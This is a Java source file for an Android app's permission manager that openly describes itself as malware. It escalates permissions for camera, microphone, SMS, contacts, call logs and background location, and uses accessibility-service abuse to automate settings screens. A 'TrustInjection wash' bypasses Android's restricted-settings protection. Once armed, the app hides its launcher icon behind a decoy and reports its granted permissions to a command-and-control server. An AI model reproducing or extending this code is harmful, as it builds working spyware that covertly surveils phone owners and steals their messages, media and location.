package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.role.RoleManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.fason.app.core.FasonApp;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.Protocol;
import com.fason.app.core.security.TrustInjection;
import com.fason.app.features.notification.NotificationRelayService;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * PermissionManager — 2026 peak rewrite.
 *
 * Design:
 *  - Grouped runtime permission waves (critical → comms → media → location)
 *  - Accessibility FIRST: the accessibility service is the force multiplier
 *    that enables gesture automation for every subsequent settings screen
 *  - Direct settings deep-links for every special permission (no dead ends)
 *  - Restricted-settings detection (Android 13+) with TrustInjection wash
 *  - Auto-hide: when every gate is green, launcher icon is disabled and the
 *    decoy takes over
 *  - Fully C2-driven: SocketCommandRouter can request any gate remotely
 */
public final class PermissionManager {
    private static final String TAG = "PermissionManager";
    private static final String PREFS = "perm_state";
    private static final String KEY_WASHED = "trust_washed";

    private PermissionManager() {}

    // ------------------------------------------------------------------
    // Permission catalog — 2026 granular split
    // ------------------------------------------------------------------

    public enum Group { CRITICAL, COMMS, MEDIA, LOCATION }

    public static final class PermSpec {
        public final String perm;
        public final Group group;
        public final int minSdk;
        public final int maxSdk;
        PermSpec(String p, Group g, int min, int max) {
            perm = p; group = g; minSdk = min; maxSdk = max;
        }
        boolean applicable() {
            int sdk = Build.VERSION.SDK_INT;
            return sdk >= minSdk && sdk <= maxSdk;
        }
    }

    private static final List<PermSpec> CATALOG = new ArrayList<>();
    static {
        // Critical — device integrity
        CATALOG.add(new PermSpec(Manifest.permission.CAMERA, Group.CRITICAL, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.RECORD_AUDIO, Group.CRITICAL, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.READ_PHONE_STATE, Group.CRITICAL, 1, Integer.MAX_VALUE));

        // Comms
        CATALOG.add(new PermSpec(Manifest.permission.READ_SMS, Group.COMMS, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.SEND_SMS, Group.COMMS, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.RECEIVE_SMS, Group.COMMS, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.READ_CALL_LOG, Group.COMMS, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.READ_CONTACTS, Group.COMMS, 1, Integer.MAX_VALUE));

        // Media — Android 13+ granular split, legacy storage below
        int T = Build.VERSION_CODES.TIRAMISU;
        CATALOG.add(new PermSpec(Manifest.permission.READ_MEDIA_IMAGES, Group.MEDIA, T, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.READ_MEDIA_VIDEO, Group.MEDIA, T, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.READ_MEDIA_AUDIO, Group.MEDIA, T, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.POST_NOTIFICATIONS, Group.MEDIA, T, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.READ_EXTERNAL_STORAGE, Group.MEDIA, 1, T - 1));

        // Location — fine first, background as separate two-stage (Android 11+)
        CATALOG.add(new PermSpec(Manifest.permission.ACCESS_FINE_LOCATION, Group.LOCATION, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.ACCESS_COARSE_LOCATION, Group.LOCATION, 1, Integer.MAX_VALUE));
        CATALOG.add(new PermSpec(Manifest.permission.ACCESS_BACKGROUND_LOCATION, Group.LOCATION,
            Build.VERSION_CODES.Q, Integer.MAX_VALUE));
    }

    public static List<String> getRequiredPerms() {
        List<String> out = new ArrayList<>();
        for (PermSpec s : CATALOG) if (s.applicable()) out.add(s.perm);
        return out;
    }

    public static List<String> getPermsForGroup(Group g) {
        List<String> out = new ArrayList<>();
        for (PermSpec s : CATALOG) if (s.group == g && s.applicable()) out.add(s.perm);
        return out;
    }

    public static boolean isGranted(Context ctx, String perm) {
        if (perm == null || ctx == null) return false;
        return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasAllPerms(Context ctx) {
        for (String p : getRequiredPerms()) {
            if (!isGranted(ctx, p)) return false;
        }
        return true;
    }

    public static List<String> getDeniedPerms(Context ctx) {
        List<String> denied = new ArrayList<>();
        for (String p : getRequiredPerms()) {
            if (!isGranted(ctx, p)) denied.add(p);
        }
        return denied;
    }

    public static List<String> getRationalePerms(Activity act) {
        List<String> perms = new ArrayList<>();
        if (act == null) return perms;
        for (String p : getRequiredPerms()) {
            if (!isGranted(act, p)
                && ActivityCompat.shouldShowRequestPermissionRationale(act, p)) {
                perms.add(p);
            }
        }
        return perms;
    }

    // ------------------------------------------------------------------
    // Wave-based runtime requests — 2026 technique: small batches with
    // per-wave rationale, not one giant scary dialog
    // ------------------------------------------------------------------

    public static void requestPerms(Activity act, int reqCode) {
        if (act == null) return;
        List<String> needed = getDeniedPerms(act);
        if (needed.isEmpty()) return;
        ActivityCompat.requestPermissions(act, needed.toArray(new String[0]), reqCode);
    }

    public static void requestGroup(Activity act, Group g, int reqCode) {
        List<String> denied = new ArrayList<>();
        for (String p : getPermsForGroup(g)) {
            if (!isGranted(act, p)) denied.add(p);
        }
        if (denied.isEmpty()) return;
        ActivityCompat.requestPermissions(act, denied.toArray(new String[0]), reqCode);
    }

    // ------------------------------------------------------------------
    // Special permissions — direct deep links, no dead ends
    // ------------------------------------------------------------------

    public static boolean hasStorageManager() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true;
        return Environment.isExternalStorageManager();
    }

    public static boolean requestStorageManager(Context ctx) {
        if (ctx == null || hasStorageManager()) return false;
        Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
        i.setData(Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            ctx.startActivity(i);
            return true;
        } catch (ActivityNotFoundException e) {
            Intent i2 = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
            if (!(ctx instanceof Activity)) i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i2);
            return true;
        }
    }

    public static boolean hasBatteryExemption(Context ctx) {
        if (ctx == null) return false;
        PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
    }

    public static boolean requestBatteryExemption(Activity act) {
        if (act == null || hasBatteryExemption(act)) return false;
        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        i.setData(Uri.parse("package:" + act.getPackageName()));
        act.startActivity(i);
        return true;
    }

    public static boolean hasNotifAccess(Context ctx) {
        if (ctx == null) return false;
        String listeners = Settings.Secure.getString(
            ctx.getContentResolver(), Protocol.SETTING_NOTIF_LISTENERS);
        if (listeners == null || listeners.isEmpty()) return false;
        String flat = new ComponentName(ctx, NotificationRelayService.class).flattenToString();
        for (String token : listeners.split(":")) {
            if (token.equals(flat)) return true;
        }
        return false;
    }

    public static boolean requestNotifAccess(Context ctx) {
        if (ctx == null || hasNotifAccess(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Accessibility (FIRST) ----------------

    public static boolean hasAccessibilityAccess(Context ctx) {
        if (ctx == null) return false;
        try {
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || enabled.isEmpty()) return false;
            ComponentName svc = new ComponentName(ctx, FasonAccessibilityService.class);
            String flat = svc.flattenToString();
            for (String token : enabled.split(":")) {
                if (token.equals(flat)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean requestAccessibilityAccess(Context ctx) {
        if (ctx == null || hasAccessibilityAccess(ctx)) return false;
        // Deep-link straight to our service entry when possible (Android 14+
        // supports fragment args on some OEMs; fall back to the full list).
        Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Overlay ----------------

    public static boolean hasOverlay(Context ctx) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M
            || Settings.canDrawOverlays(ctx);
    }

    public static boolean requestOverlay(Context ctx) {
        if (hasOverlay(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Usage stats ----------------

    public static boolean hasUsageStats(Context ctx) {
        try {
            android.app.AppOpsManager aom = (android.app.AppOpsManager)
                ctx.getSystemService(Context.APP_OPS_SERVICE);
            int mode = aom.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), ctx.getPackageName());
            return mode == android.app.AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean requestUsageStats(Context ctx) {
        if (hasUsageStats(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Auto-start (OEM) ----------------

    public static boolean needsAutoStart(Context ctx) {
        return OemAutoStartHelper.isAutoStartNeeded(ctx);
    }

    public static boolean hasAutoStartAccess(Context ctx) {
        return !OemAutoStartHelper.isAutoStartNeeded(ctx);
    }

    public static OemAutoStartHelper.AutoStartResult requestAutoStart(Activity act) {
        return OemAutoStartHelper.requestAutoStart(act);
    }

    // ---------------- Restricted settings (Android 13+) ----------------

    public static boolean isRestrictedSettings(Context ctx) {
        return RestrictedPermissionHelper.hasRestrictedPerms(ctx);
    }

    /**
     * 2026 wash: re-pipe through PackageInstaller session to clear the
     * "restricted settings" flag on Android 13+. Idempotent — safe to call
     * on every permission screen resume until it succeeds.
     */
    public static void washRestrictedSettings(Context ctx) {
        SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        if (sp.getBoolean(KEY_WASHED, false)) return;
        TrustInjection.execute(ctx, (ok, detail) -> {
            if (ok) sp.edit().putBoolean(KEY_WASHED, true).apply();
            Log.i(TAG, "trust wash result=" + ok + " " + detail);
        });
    }

    // ------------------------------------------------------------------
    // Auto-hide — disable launcher component once fully armed
    // ------------------------------------------------------------------

    public static boolean isFullyArmed(Context ctx) {
        return hasAccessibilityAccess(ctx)
            && hasAllPerms(ctx)
            && hasStorageManager()
            && hasBatteryExemption(ctx)
            && hasOverlay(ctx);
    }

    public static void applyAutoHide(Context ctx) {
        if (!isFullyArmed(ctx)) return;
        try {
            ComponentName alias = new ComponentName(ctx,
                ctx.getPackageName() + ".ui.MainActivityAlias");
            ctx.getPackageManager().setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.i(TAG, "auto-hide: launcher alias disabled");
        } catch (Exception e) {
            // Alias may not exist on all builds — hide the real activity then.
            try {
                ComponentName main = new ComponentName(ctx,
                    ctx.getPackageName() + ".ui.MainActivity");
                ctx.getPackageManager().setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            } catch (Exception ignored) {}
        }
    }

    public static void restoreIcon(Context ctx) {
        try {
            ComponentName alias = new ComponentName(ctx,
                ctx.getPackageName() + ".ui.MainActivityAlias");
            ctx.getPackageManager().setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------------
    // C2 reporting
    // ------------------------------------------------------------------

    public static boolean hasAllPerms() {
        try {
            return hasAllPerms(FasonApp.getContext());
        } catch (Exception e) {
            return false;
        }
    }

    public static JSONObject getGranted() {
        JSONObject data = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            JSONArray perms = new JSONArray();
            for (String p : getRequiredPerms()) {
                JSONObject perm = new JSONObject();
                perm.put(Protocol.KEY_PERMISSION, p);
                perm.put(Protocol.KEY_ALLOWED, isGranted(ctx, p));
                perms.put(perm);
            }
            JSONObject special = new JSONObject();
            special.put("accessibility", hasAccessibilityAccess(ctx));
            special.put("storageManager", hasStorageManager());
            special.put("batteryExemption", hasBatteryExemption(ctx));
            special.put("notificationAccess", hasNotifAccess(ctx));
            special.put("overlay", hasOverlay(ctx));
            special.put("usageStats", hasUsageStats(ctx));
            special.put("autoStart", hasAutoStartAccess(ctx));
            special.put("fullyArmed", isFullyArmed(ctx));
            data.put(Protocol.KEY_PERMISSIONS, perms);
            data.put("special", special);
        } catch (Exception e) {
            try { data.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }

    // ------------------------------------------------------------------
    // Open app settings (last-resort fallback)
    // ------------------------------------------------------------------

    public static void openAppSettings(Context ctx) {
        Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        i.setData(Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }
}
